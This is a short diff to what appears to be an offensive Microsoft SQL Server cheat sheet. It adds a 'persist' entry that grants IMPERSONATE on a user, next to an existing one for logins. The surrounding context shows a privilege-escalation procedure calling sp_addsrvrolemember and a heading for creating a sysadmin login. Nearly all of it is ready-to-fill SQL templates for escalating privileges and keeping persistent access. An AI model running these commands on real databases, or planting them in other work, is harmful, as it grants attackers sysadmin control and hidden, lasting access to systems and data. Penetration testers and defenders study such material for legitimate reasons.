@@ -116,11 +116,16 @@ CREATE PROCEDURE sp_privesc WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember '<
 ```
 
 
-## persist - grant IMPERSONATE
+## persist - grant IMPERSONATE (login)
 ```sql
 GRANT IMPERSONATE ON LOGIN::<login|sa> to [<user>]
 ```
 
+
+## persist - grant IMPERSONATE (user)
+```sql
+GRANT IMPERSONATE ON USER::<login|sa> to [<user>]
+```
 
 ## persist - Create login with sysadmin privs
 ```sql
